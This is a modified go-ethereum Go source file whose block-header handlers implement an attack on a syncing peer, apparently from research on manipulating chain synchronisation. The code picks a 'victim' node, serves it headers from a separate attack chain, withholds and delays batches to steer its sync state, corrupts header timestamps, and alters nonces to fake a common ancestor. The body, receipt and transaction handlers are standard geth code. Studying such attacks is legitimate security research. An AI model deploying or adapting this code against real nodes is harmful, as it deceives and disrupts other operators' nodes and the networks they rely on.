// Copyright 2020 The go-ethereum Authors
// This file is part of the go-ethereum library.
//
// The go-ethereum library is free software: you can redistribute it and/or modify
// it under the terms of the GNU Lesser General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// The go-ethereum library is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU Lesser General Public License for more details.
//
// You should have received a copy of the GNU Lesser General Public License
// along with the go-ethereum library. If not, see <http://www.gnu.org/licenses/>.

package eth

import (
	"encoding/json"
	"fmt"
	"bytes"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/log"
	"github.com/ethereum/go-ethereum/rlp"
	"github.com/ethereum/go-ethereum/trie"

	"github.com/ethereum/go-ethereum/attack/bridge"
)

var attackChain *core.BlockChain
var lastPartialBatchServed bool


// handleGetBlockHeaders66 is the eth/66 version of handleGetBlockHeaders
func handleGetBlockHeaders66(backend Backend, msg Decoder, peer *Peer) error {
	// Decode the complex header query
	var query GetBlockHeadersPacket66
	if err := msg.Decode(&query); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}

	log.Info("Received query", "query", query.GetBlockHeadersPacket, "id", query.RequestId)

	if must, chainType := bridge.MustChangeAttackChain(); must {
		db := bridge.GetChainDatabase(chainType)
		var err error
		log.Info("Creating attackChain")
		headerchain, err := core.NewHeaderChain(db, nil, nil, nil)
		if err != nil {
			log.Error("error", "error", err)
			return fmt.Errorf("Can't create attack chain: %v", err)
		}
		headerchain.SetCurrentHeader(bridge.Latest())
		log.Info("Created attackChain")
		attackChain = &core.BlockChain{}
		attackChain.SetHc(headerchain)
	}

	q := query.GetBlockHeadersPacket
	bq := &bridge.GetBlockHeadersPacket{
		Origin: bridge.HashOrNumber{Hash: q.Origin.Hash, Number: q.Origin.Number},
		Amount: q.Amount,
		Skip: q.Skip,
		Reverse: q.Reverse,
	}
	chain := backend.Chain()
	if bridge.MustUseAttackChain(bq, peer.Peer.ID().String()[:8]) {
		chain = attackChain
		log.Info("Using attack chain to fulfil it")
	} else {
		log.Info("Using honest chain to fulfil it")
	}

	/*
	if q.Amount == 192 && q.Skip == 0 && q.Reverse == false &&
	   bridge.IsVictim(peer.Peer.ID().String()[:8]) &&
	   bridge.LastPartialBatch(q.Origin.Number) {	// If it is the last, partial batch, we can't provide it
													// or we'll be immediately disconnected. So we drop the request.
		return nil


	}
	*/

	if q.Amount == 192 && q.Skip == 0 && q.Reverse == false &&
	 bridge.IsVictim(peer.Peer.ID().String()[:8]) && bridge.DoingPrediction() {
	   	if bridge.LastPartialBatch(q.Origin.Number) {
	   		return nil						// We won't serve last 88 headers during prediction
	   	}

	   	if !bridge.PredictionBatchExists(q.Origin.Number) {
	   		return nil						// If we get a query for a batch we don't have, we just drop it.
	   										// Very soon the syncOp will be stopped and a new one started anyway.
	   	}
	}


	response := ServiceGetBlockHeadersQuery(chain, query.GetBlockHeadersPacket, peer)
	
	/*
	if q.Amount == 192 && q.Skip == 0 && !q.Reverse && 
	 bridge.IsVictim(peer.Peer.ID().String()[:8]) && bridge.DoingSync() {
	 	log.Info("Calling TryWithhold()")
		ok := bridge.TryWithhold(query.Origin.Number)
		if false && ok && bridge.MustWithhold(query.Origin.Number) {
			log.Info("Withheld query", "query", q)
			go func(wq GetBlockHeadersPacket66, wr []rlp.RawValue) {
				timeout := time.NewTimer(5*time.Second)
				select {
					case <-bridge.ReleaseResponse():
						bridge.MiniDelayBeforeServingBatch()
					case <-timeout.C:
						bridge.ProcessStepsAtSkeletonEnd(wq.GetBlockHeadersPacket.Origin.Number)
				}
				log.Info("Releasing response", "query", wq.GetBlockHeadersPacket)
				err := peer.ReplyBlockHeadersRLP(wq.RequestId, wr)
				if err != nil {
					log.Error("Replying to withheld query failed", "err", err)
				}
			}(query, response)
			return nil
		}
	}
	*/

	return peer.ReplyBlockHeadersRLP(query.RequestId, response)
}

// ServiceGetBlockHeadersQuery assembles the response to a header query. It is
// exposed to allow external packages to test protocol behavior.
func ServiceGetBlockHeadersQuery(chain *core.BlockChain, query *GetBlockHeadersPacket, peer *Peer) []rlp.RawValue {
	if query.Skip == 0 {
		// The fast path: when the request is for a contiguous segment of headers.
		return serviceContiguousBlockHeaderQuery(chain, query, peer)
	} else {
		return serviceNonContiguousBlockHeaderQuery(chain, query, peer)
	}
}

func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHeadersPacket, peer *Peer) []rlp.RawValue {
	hashMode := query.Origin.Hash != (common.Hash{})
	first := true
	maxNonCanonical := uint64(100)

	queryForMaster := false
	if hashMode /*&& query.Origin.Hash == bridge.Latest().Hash()*/ && query.Amount == 2 && query.Skip == 63 && query.Reverse {
		//bridge.SetMasterPeer()
		bridge.SetVictimIfNone(peer.Peer, peer.td)
		if bridge.IsVictim(peer.Peer.ID().String()[:8]) {
			bridge.SetMasterPeer()
			// Give more time to peers to reconnect to victim
			if bridge.DoingPrediction() {
				time.Sleep(3*time.Second)
			}
		}
		queryForMaster = true

		bq := &bridge.GetBlockHeadersPacket{
			Origin: bridge.HashOrNumber{Hash: query.Origin.Hash, Number: query.Origin.Number},
			Amount: query.Amount,
			Skip: query.Skip,
			Reverse: query.Reverse,
		}

		if chain != attackChain && bridge.MustUseAttackChain(bq, peer.Peer.ID().String()[:8]) {
			chain = attackChain 			// As we changed the bridge state (setting a victim), re-check whether
											// we need to use attack chain
			log.Info("Switched to attack chain because victim is now set")
		}
	} else {
		log.Info("bridge provided latest", "hash", bridge.Latest().Hash())
	}

	pivoting := false
	if !hashMode && query.Amount == 2 && query.Skip == 55 && !query.Reverse &&
	 bridge.IsVictim(peer.Peer.ID().String()[:8]) {
	 	// Pivoting request.
		// When doing prediction, we must delay the pivoting request so that the victim will find the
		// master peer already disconnected when it sends out the second skeleton request. This will
		// immediately start a new syncOp, without waiting for a timeout.
		// When terminating the honest state sync, we must disconnect after a pivoting request to
		// make the syncOp fail at the next request and similarly start a new syncOp.
		pivoting = true

		if bridge.DoingPrediction() {
			bridge.WaitBeforePivoting()
		}

		if bridge.DoingSync() || bridge.DoingDelivery() {
			if !bridge.SteppingDone() && int(query.Origin.Number)/192 >= bridge.SteppingBatches() - 10 {
				time.Sleep(1*time.Second)
			}
			if bridge.MidRollbackDone() {
				bridge.SkeletonAndPivotingDelay()
			}
		}
	}

	skeleton := false
	corruptHeader := false
	if !hashMode && query.Amount == 128 && query.Skip == 191 && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
		bridge.SetSkeletonStart(query.Origin.Number)
		skeleton = true

		// Give more time to peers to reconnect to victim
		if bridge.DoingPrediction() {
			time.Sleep(3*time.Second)
		}

		if bridge.DoingSync() || bridge.DoingDelivery() {
			query.Amount = 1

			if bridge.SteppingDone() {
				if bridge.MidRollbackDone() {
					bridge.SkeletonAndPivotingDelay()
				} else if int(query.Origin.Number) < 192*bridge.SteppingBatches() {
					bridge.MidRollback()
					time.Sleep(500*time.Millisecond) // Leave some time to the other peer to receive and process msg.MidRollback
					return nil
				}
			}

			if !bridge.SteppingDone() {
				if int(query.Origin.Number)%192 != 0 {
					log.Crit("Skeleton not aligned to batch size", "number", query.Origin.Number)
				}
				if int(query.Origin.Number)/192 == bridge.SteppingBatches() - 10 {
					bridge.TerminatingStepping()
				}

				if int(query.Origin.Number)/192 >= bridge.SteppingBatches() - 10 {
					time.Sleep(3*time.Second)
				}
				if int(query.Origin.Number)/192 == bridge.SteppingBatches()+1 {
					corruptHeader = true
					bridge.EndOfStepping()
				}
				if int(query.Origin.Number)/192 < bridge.SteppingBatches() - 29 {
					query.Amount = 19
				}
				if int(query.Origin.Number)/192 < bridge.SteppingBatches() - 18 {
					query.Amount = 6
				}
			}
			if query.Amount != 128 {
				log.Info("Providing fewer skeleton headers", "amount", query.Amount)
			}
		}
	}


	// Gather headers until the fetch or network limits is reached
	var (
		bytes   common.StorageSize
		headers []rlp.RawValue
		unknown bool
		lookups int

		headForMasterQuery uint64
		pivotNumber uint64

	)
	for !unknown && len(headers) < int(query.Amount) && bytes < softResponseLimit &&
		len(headers) < maxHeadersServe && lookups < 2*maxHeadersServe {
		lookups++
		// Retrieve the next header satisfying the query
		var origin *types.Header
		if hashMode {
			if first {
				first = false
				log.Info("Trying to load query origin")
				origin = chain.GetHeaderByHash(query.Origin.Hash)
				if origin != nil {
					query.Origin.Number = origin.Number.Uint64()
					headForMasterQuery = query.Origin.Number
				} else {
					log.Info("Can't find origin")
				}
			} else {
				origin = chain.GetHeader(query.Origin.Hash, query.Origin.Number)
			}
		} else {
			origin = chain.GetHeaderByNumber(query.Origin.Number)
		}
		if origin == nil{
			break
		}

		if pivoting && len(headers) == 0 {
			pivotNumber = origin.Number.Uint64()
		}

		if bridge.DoingSync() && bridge.StopMoving() && query.Origin.Number > bridge.FixedHead() && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
			log.Info("Limiting query results", "fixedHead", bridge.FixedHead(), "origin", query.Origin.Number)
			break
		}

		if corruptHeader {
			origin = types.CopyHeader(origin)
			origin.Time = origin.Time + 1
			corruptHeader = false
			log.Info("Corrupting header", "number", origin.Number)
		}

		if rlpData, err := rlp.EncodeToBytes(origin); err != nil {
			log.Crit("Unable to decode our own headers", "err", err)
		} else {
			headers = append(headers, rlp.RawValue(rlpData))
			bytes += common.StorageSize(len(rlpData))
		}

		if len(headers) == 2 && pivoting {
			bridge.SetPivot(pivotNumber)
		}

		// Advance to the next header of the query
		switch {
		case hashMode && query.Reverse:
			// Hash based traversal towards the genesis block
			ancestor := query.Skip + 1
			if ancestor == 0 {
				unknown = true
			} else {
				query.Origin.Hash, query.Origin.Number = chain.GetAncestor(query.Origin.Hash, query.Origin.Number, ancestor, &maxNonCanonical)
				unknown = (query.Origin.Hash == common.Hash{})
			}
		case hashMode && !query.Reverse:
			// Hash based traversal towards the leaf block
			var (
				current = origin.Number.Uint64()
				next    = current + query.Skip + 1
			)
			if next <= current {
				infos, _ := json.MarshalIndent(peer.Peer.Info(), "", "  ")
				peer.Log().Warn("GetBlockHeaders skip overflow attack", "current", current, "skip", query.Skip, "next", next, "attacker", infos)
				unknown = true
			} else {
				if header := chain.GetHeaderByNumber(next); header != nil {
					nextHash := header.Hash()
					expOldHash, _ := chain.GetAncestor(nextHash, next, query.Skip+1, &maxNonCanonical)
					if expOldHash == query.Origin.Hash {
						query.Origin.Hash, query.Origin.Number = nextHash, next
					} else {
						unknown = true
					}
				} else {
					unknown = true
				}
			}
		case query.Reverse:
			// Number based traversal towards the genesis block
			if query.Origin.Number >= query.Skip+1 {
				query.Origin.Number -= query.Skip + 1
			} else {
				unknown = true
			}

		case !query.Reverse:
			// Number based traversal towards the leaf block
			query.Origin.Number += query.Skip + 1
		}
	}

	if queryForMaster && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
		bridge.SetPivot(headForMasterQuery-64)
	}
	if pivoting {
		bridge.PivotingServed()
	}
	if skeleton && bridge.DoingSync() {
		bridge.StepPRNG(2*len(headers), 100)
	}
	return headers
}

func serviceContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHeadersPacket, peer *Peer) []rlp.RawValue {
	count := query.Amount
	if count > maxHeadersServe {
		count = maxHeadersServe
	}

	if query.Origin.Hash == (common.Hash{}) {
		// Number mode, just return the canon chain segment. The backend
		// delivers in [N, N-1, N-2..] descending order, so we need to
		// accommodate for that.

		from := query.Origin.Number

		// Limit results during sync according to the fixed head
		if bridge.DoingSync() && bridge.IsVictim(peer.Peer.ID().String()[:8]) && bridge.StopMoving() &&
		from + count > bridge.FixedHead() && !query.Reverse {
			count = bridge.FixedHead() - from + 1
		}

		if !query.Reverse {
			from = from + count - 1
		}
		headers := chain.GetHeadersFrom(from, count)
		log.Info("Got headers for query", "amount", query.Amount, "from", query.Origin.Number, "len_headers", len(headers), "peer", peer.Peer.ID().String()[:8])
		if !query.Reverse {
			for i, j := 0, len(headers)-1; i < j; i, j = i+1, j-1 {
				headers[i], headers[j] = headers[j], headers[i]
			}
		}

		if query.Amount == 192 && !query.Reverse && bridge.IsVictim(peer.Peer.ID().String()[:8]) {

			// Introducing delay and marking batch as served
		 	if bridge.DoingPredictionOrReady() {
		 		bridge.DelayBeforeServingBatch()
				if bridge.LastFullBatch(query.Origin.Number) {
					bridge.WaitBeforeLastFullBatch()
				}
				bridge.ServedBatchRequest(query.Origin.Number, peer.Peer.ID().String()[:8])
		 	}

		 	if bridge.DoingDelivery() {
		 		bridge.DelayBeforeServingBatch()
		 	}

		 	/*
		 	This is WRONG, as the master peer only serves some of the batches.
		 	
		 	// Mark PRNG steps, for all full batches of prediction and sync phases.
		 	if len(headers) == 192 {
		 		bridge.StepPRNG(2, 100)
		 	}
		 	*/
		 }

		// Note that the last partial batch cannot be 192 blocks in sync phase. Indeed, if it was 192 blocks,
		// as the head is fixed, it would be included in the skeleton, and therefore it would not be the last
		// partial batch. This would then have length 0.
		if len(headers) < 192 && !query.Reverse && bridge.DoingSync() &&
		 bridge.IsVictim(peer.Peer.ID().String()[:8]) && bridge.ProvidedSkeleton() && !lastPartialBatchServed {	
		 	lastPartialBatchServed = true
			log.Info("Delaying last partial batch")
			bridge.DelayBeforeServingBatch()

			// Mark PRNG steps, for last partial batch of sync phase.
			bridge.StepPRNG(len(headers) - 1, 1)	// All headers will be verified, apart from the last two
													// as mini reorg delay (-2). However, as checkFrequency == 1
													// now, there is one additional (and useless) call to the PRNG (+1).
													// So we have len(headers) -2 + 1 calls to the PRNG.

			//bridge.StepPRNG(3, 1)					// Mark last 2 headers in advance (+1 for useless call)
			
			//bridge.CommitPRNG()
		}

		// We add delays during ancestor search for the following reasons:
		// Prediction - Allow enough time to peers to reconnect to the victim
		// Before batch stepping - Leave (generous) time to orch to compute the number of stepping batches
		// After stepping, during mid rollback - Allow time to kicked peer to reconnect to the victim
		if !bridge.MidRollbackDone() && bridge.IsVictim(peer.Peer.ID().String()[:8]) &&
		 query.Amount==1 && !bridge.AncestorFound() {
			time.Sleep(3*time.Second)
		}
		// Cheat about common ancestor
		if bridge.DoingSync() && bridge.IsVictim(peer.Peer.ID().String()[:8]) &&
		 query.Amount==1 && !bridge.AncestorFound() && bridge.SteppingDone() {
			fakeCommonAncestor := bridge.AncestorMidPoint()
		 	log.Info("Corrupting headers", "fakeCommonAncestor", fakeCommonAncestor)

			var newHeaders []rlp.RawValue
			for _, header := range headers {
				h := new(types.Header)
				s := rlp.NewStream(bytes.NewReader(header), uint64(len(header)))
				s.Decode(h)
				if h.Number.Uint64() > fakeCommonAncestor {
					/*
					b := h.Nonce[7]
					b += 1
					h.Nonce = append(h.Nonce[:7], b)	// Corruption
					*/
					h.Nonce[7]++
				}
				enc, err := rlp.EncodeToBytes(h)
				if err != nil {
					log.Crit("Cannot decode corrupt header", "err", err)
				}
				newHeaders = append(newHeaders, enc)
			}
			headers = newHeaders
		}

		return headers
	}
	// Hash mode.
	var (
		headers []rlp.RawValue
		hash    = query.Origin.Hash
		header  = chain.GetHeaderByHash(hash)
	)
	if header != nil {
		rlpData, _ := rlp.EncodeToBytes(header)
		headers = append(headers, rlpData)
	} else {
		// We don't even have the origin header
		return headers
	}
	num := header.Number.Uint64()
	if !query.Reverse {
		// Theoretically, we are tasked to deliver header by hash H, and onwards.
		// However, if H is not canon, we will be unable to deliver any descendants of
		// H.
		if canonHash := chain.GetCanonicalHash(num); canonHash != hash {
			// Not canon, we can't deliver descendants
			return headers
		}
		descendants := chain.GetHeadersFrom(num+count-1, count-1)
		for i, j := 0, len(descendants)-1; i < j; i, j = i+1, j-1 {
			descendants[i], descendants[j] = descendants[j], descendants[i]
		}
		headers = append(headers, descendants...)
		return headers
	}
	{ // Last mode: deliver ancestors of H
		for i := uint64(1); header != nil && i < count; i++ {
			header = chain.GetHeaderByHash(header.ParentHash)
			if header == nil {
				break
			}
			rlpData, _ := rlp.EncodeToBytes(header)
			headers = append(headers, rlpData)
		}
		return headers
	}
}

func handleGetBlockBodies66(backend Backend, msg Decoder, peer *Peer) error {
	// Decode the block body retrieval message
	var query GetBlockBodiesPacket66
	if err := msg.Decode(&query); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	response := ServiceGetBlockBodiesQuery(backend.Chain(), query.GetBlockBodiesPacket)
	return peer.ReplyBlockBodiesRLP(query.RequestId, response)
}

// ServiceGetBlockBodiesQuery assembles the response to a body query. It is
// exposed to allow external packages to test protocol behavior.
func ServiceGetBlockBodiesQuery(chain *core.BlockChain, query GetBlockBodiesPacket) []rlp.RawValue {
	// Gather blocks until the fetch or network limits is reached
	var (
		bytes  int
		bodies []rlp.RawValue
	)
	for lookups, hash := range query {
		if bytes >= softResponseLimit || len(bodies) >= maxBodiesServe ||
			lookups >= 2*maxBodiesServe {
			break
		}
		if data := chain.GetBodyRLP(hash); len(data) != 0 {
			bodies = append(bodies, data)
			bytes += len(data)
		}
	}
	return bodies
}

func handleGetNodeData66(backend Backend, msg Decoder, peer *Peer) error {
	// Decode the trie node data retrieval message
	var query GetNodeDataPacket66
	if err := msg.Decode(&query); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	response := ServiceGetNodeDataQuery(backend.Chain(), query.GetNodeDataPacket)
	return peer.ReplyNodeData(query.RequestId, response)
}

// ServiceGetNodeDataQuery assembles the response to a node data query. It is
// exposed to allow external packages to test protocol behavior.
func ServiceGetNodeDataQuery(chain *core.BlockChain, query GetNodeDataPacket) [][]byte {
	// Gather state data until the fetch or network limits is reached
	var (
		bytes int
		nodes [][]byte
	)
	for lookups, hash := range query {
		if bytes >= softResponseLimit || len(nodes) >= maxNodeDataServe ||
			lookups >= 2*maxNodeDataServe {
			break
		}
		// Retrieve the requested state entry
		entry, err := chain.TrieNode(hash)
		if len(entry) == 0 || err != nil {
			// Read the contract code with prefix only to save unnecessary lookups.
			entry, err = chain.ContractCodeWithPrefix(hash)
		}
		if err == nil && len(entry) > 0 {
			nodes = append(nodes, entry)
			bytes += len(entry)
		}
	}
	return nodes
}

func handleGetReceipts66(backend Backend, msg Decoder, peer *Peer) error {
	// Decode the block receipts retrieval message
	var query GetReceiptsPacket66
	if err := msg.Decode(&query); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	response := ServiceGetReceiptsQuery(backend.Chain(), query.GetReceiptsPacket)
	return peer.ReplyReceiptsRLP(query.RequestId, response)
}

// ServiceGetReceiptsQuery assembles the response to a receipt query. It is
// exposed to allow external packages to test protocol behavior.
func ServiceGetReceiptsQuery(chain *core.BlockChain, query GetReceiptsPacket) []rlp.RawValue {
	// Gather state data until the fetch or network limits is reached
	var (
		bytes    int
		receipts []rlp.RawValue
	)
	for lookups, hash := range query {
		if bytes >= softResponseLimit || len(receipts) >= maxReceiptsServe ||
			lookups >= 2*maxReceiptsServe {
			break
		}
		// Retrieve the requested block's receipts
		results := chain.GetReceiptsByHash(hash)
		if results == nil {
			if header := chain.GetHeaderByHash(hash); header == nil || header.ReceiptHash != types.EmptyRootHash {
				continue
			}
		}
		// If known, encode and queue for response packet
		if encoded, err := rlp.EncodeToBytes(results); err != nil {
			log.Error("Failed to encode receipt", "err", err)
		} else {
			receipts = append(receipts, encoded)
			bytes += len(encoded)
		}
	}
	return receipts
}

func handleNewBlockhashes(backend Backend, msg Decoder, peer *Peer) error {
	// A batch of new block announcements just arrived
	ann := new(NewBlockHashesPacket)
	if err := msg.Decode(ann); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	// Mark the hashes as present at the remote node
	for _, block := range *ann {
		peer.markBlock(block.Hash)
	}
	// Deliver them all to the backend for queuing
	return backend.Handle(peer, ann)
}

func handleNewBlock(backend Backend, msg Decoder, peer *Peer) error {
	// Retrieve and decode the propagated block
	ann := new(NewBlockPacket)
	if err := msg.Decode(ann); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	if err := ann.sanityCheck(); err != nil {
		return err
	}
	if hash := types.CalcUncleHash(ann.Block.Uncles()); hash != ann.Block.UncleHash() {
		log.Warn("Propagated block has invalid uncles", "have", hash, "exp", ann.Block.UncleHash())
		return nil // TODO(karalabe): return error eventually, but wait a few releases
	}
	if hash := types.DeriveSha(ann.Block.Transactions(), trie.NewStackTrie(nil)); hash != ann.Block.TxHash() {
		log.Warn("Propagated block has invalid body", "have", hash, "exp", ann.Block.TxHash())
		return nil // TODO(karalabe): return error eventually, but wait a few releases
	}
	ann.Block.ReceivedAt = msg.Time()
	ann.Block.ReceivedFrom = peer

	// Mark the peer as owning the block
	peer.markBlock(ann.Block.Hash())

	return backend.Handle(peer, ann)
}

func handleBlockHeaders66(backend Backend, msg Decoder, peer *Peer) error {
	// A batch of headers arrived to one of our previous requests
	res := new(BlockHeadersPacket66)
	if err := msg.Decode(res); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	metadata := func() interface{} {
		hashes := make([]common.Hash, len(res.BlockHeadersPacket))
		for i, header := range res.BlockHeadersPacket {
			hashes[i] = header.Hash()
		}
		return hashes
	}
	return peer.dispatchResponse(&Response{
		id:   res.RequestId,
		code: BlockHeadersMsg,
		Res:  &res.BlockHeadersPacket,
	}, metadata)
}

func handleBlockBodies66(backend Backend, msg Decoder, peer *Peer) error {
	// A batch of block bodies arrived to one of our previous requests
	res := new(BlockBodiesPacket66)
	if err := msg.Decode(res); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	metadata := func() interface{} {
		var (
			txsHashes   = make([]common.Hash, len(res.BlockBodiesPacket))
			uncleHashes = make([]common.Hash, len(res.BlockBodiesPacket))
		)
		hasher := trie.NewStackTrie(nil)
		for i, body := range res.BlockBodiesPacket {
			txsHashes[i] = types.DeriveSha(types.Transactions(body.Transactions), hasher)
			uncleHashes[i] = types.CalcUncleHash(body.Uncles)
		}
		return [][]common.Hash{txsHashes, uncleHashes}
	}
	return peer.dispatchResponse(&Response{
		id:   res.RequestId,
		code: BlockBodiesMsg,
		Res:  &res.BlockBodiesPacket,
	}, metadata)
}

func handleNodeData66(backend Backend, msg Decoder, peer *Peer) error {
	// A batch of node state data arrived to one of our previous requests
	res := new(NodeDataPacket66)
	if err := msg.Decode(res); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	return peer.dispatchResponse(&Response{
		id:   res.RequestId,
		code: NodeDataMsg,
		Res:  &res.NodeDataPacket,
	}, nil) // No post-processing, we're not using this packet anymore
}

func handleReceipts66(backend Backend, msg Decoder, peer *Peer) error {
	// A batch of receipts arrived to one of our previous requests
	res := new(ReceiptsPacket66)
	if err := msg.Decode(res); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	metadata := func() interface{} {
		hasher := trie.NewStackTrie(nil)
		hashes := make([]common.Hash, len(res.ReceiptsPacket))
		for i, receipt := range res.ReceiptsPacket {
			hashes[i] = types.DeriveSha(types.Receipts(receipt), hasher)
		}
		return hashes
	}
	return peer.dispatchResponse(&Response{
		id:   res.RequestId,
		code: ReceiptsMsg,
		Res:  &res.ReceiptsPacket,
	}, metadata)
}

func handleNewPooledTransactionHashes(backend Backend, msg Decoder, peer *Peer) error {
	// New transaction announcement arrived, make sure we have
	// a valid and fresh chain to handle them
	if !backend.AcceptTxs() {
		return nil
	}
	ann := new(NewPooledTransactionHashesPacket)
	if err := msg.Decode(ann); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	// Schedule all the unknown hashes for retrieval
	for _, hash := range *ann {
		peer.markTransaction(hash)
	}
	return backend.Handle(peer, ann)
}

func handleGetPooledTransactions66(backend Backend, msg Decoder, peer *Peer) error {
	// Decode the pooled transactions retrieval message
	var query GetPooledTransactionsPacket66
	if err := msg.Decode(&query); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	hashes, txs := answerGetPooledTransactions(backend, query.GetPooledTransactionsPacket, peer)
	return peer.ReplyPooledTransactionsRLP(query.RequestId, hashes, txs)
}

func answerGetPooledTransactions(backend Backend, query GetPooledTransactionsPacket, peer *Peer) ([]common.Hash, []rlp.RawValue) {
	// Gather transactions until the fetch or network limits is reached
	var (
		bytes  int
		hashes []common.Hash
		txs    []rlp.RawValue
	)
	for _, hash := range query {
		if bytes >= softResponseLimit {
			break
		}
		// Retrieve the requested transaction, skipping if unknown to us
		tx := backend.TxPool().Get(hash)
		if tx == nil {
			continue
		}
		// If known, encode and queue for response packet
		if encoded, err := rlp.EncodeToBytes(tx); err != nil {
			log.Error("Failed to encode transaction", "err", err)
		} else {
			hashes = append(hashes, hash)
			txs = append(txs, encoded)
			bytes += len(encoded)
		}
	}
	return hashes, txs
}

func handleTransactions(backend Backend, msg Decoder, peer *Peer) error {
	// Transactions arrived, make sure we have a valid and fresh chain to handle them
	if !backend.AcceptTxs() {
		return nil
	}
	// Transactions can be processed, parse all of them and deliver to the pool
	var txs TransactionsPacket
	if err := msg.Decode(&txs); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	for i, tx := range txs {
		// Validate and mark the remote transaction
		if tx == nil {
			return fmt.Errorf("%w: transaction %d is nil", errDecode, i)
		}
		peer.markTransaction(tx.Hash())
	}
	return backend.Handle(peer, &txs)
}

func handlePooledTransactions66(backend Backend, msg Decoder, peer *Peer) error {
	// Transactions arrived, make sure we have a valid and fresh chain to handle them
	if !backend.AcceptTxs() {
		return nil
	}
	// Transactions can be processed, parse all of them and deliver to the pool
	var txs PooledTransactionsPacket66
	if err := msg.Decode(&txs); err != nil {
		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
	}
	for i, tx := range txs.PooledTransactionsPacket {
		// Validate and mark the remote transaction
		if tx == nil {
			return fmt.Errorf("%w: transaction %d is nil", errDecode, i)
		}
		peer.markTransaction(tx.Hash())
	}
	requestTracker.Fulfil(peer.id, peer.version, PooledTransactionsMsg, txs.RequestId)

	return backend.Handle(peer, &txs.PooledTransactionsPacket)
}
